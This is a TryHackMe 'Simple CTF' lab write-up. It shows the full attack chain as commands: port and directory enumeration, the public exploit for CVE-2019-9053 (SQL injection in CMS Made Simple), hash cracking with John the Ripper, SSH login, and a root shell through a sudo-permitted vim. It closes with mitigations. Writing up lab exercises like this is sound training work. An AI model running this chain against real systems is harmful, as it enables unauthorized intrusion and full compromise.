#  Simple CTF — TryHackMe Write-up

##  Overview

This write-up documents the exploitation of the *Simple CTF* room on TryHackMe.
The objective was to enumerate services, identify vulnerabilities, gain access, and escalate privileges.

---

##  Reconnaissance

I started with a full port scan using Nmap:

```
nmap -sC -sV -p- <IP>
```

###  Results:

* 21/tcp → FTP
* 80/tcp → HTTP
* 2222/tcp → SSH (non-standard port)

The presence of a web server suggested a potential attack surface.

---

##  Web Enumeration

I used Gobuster to discover hidden directories:

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

###  Discovery:

* /simple

Accessing `/simple` revealed a CMS interface.

---

##  Identifying the Application

By inspecting the page source, I identified the application as:

CMS Made Simple

---

##  Vulnerability Discovery

Using Searchsploit:

```
searchsploit "CMS Made Simple"
```

###  Result:

CVE-2019-9053 — SQL Injection

This vulnerability allows extraction of sensitive data from the database.

---

##  Exploitation

I downloaded the exploit:

```
searchsploit -m 46635
```

Then executed it:

```
python2 46635.py -u http://<IP>/simple
```

###  Output:

* Username: mitch
* Password hash
* Salt

---

##  Password Cracking

I saved the hash into a file:

```
nano hash.txt
```

Then used John the Ripper:

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

To display the cracked password:

```
john --show hash.txt
```

---

##  Gaining Access

Using the recovered credentials:

```
ssh mitch@<IP> -p 2222
```

Successfully obtained user access.

---

##  Privilege Escalation

After gaining access as `mitch`, I checked sudo permissions:

```
sudo -l
```

###  Result:

User mitch may run the following commands:
(root) NOPASSWD: /usr/bin/vim

This means Vim can be executed as root without a password.

---

##  Exploiting Vim

I used Vim to spawn a root shell:

```
sudo vim -c ':!/bin/bash'
```

Alternative method inside Vim:

```
:!/bin/bash
```

---

##  Result

Root access successfully obtained.

---

##  Why This Works

* Vim allows execution of system commands
* Running Vim as root = root shell
* Misconfigured sudo permissions lead to privilege escalation

---

##  Mitigation

* Avoid granting sudo access to interactive programs like Vim
* Follow the principle of least privilege
* Keep systems updated and properly configured

---

##  Lessons Learned

* Enumeration is critical
* Web vulnerabilities can lead to full compromise
* Always verify service detection
* Understand exploits instead of blindly using them
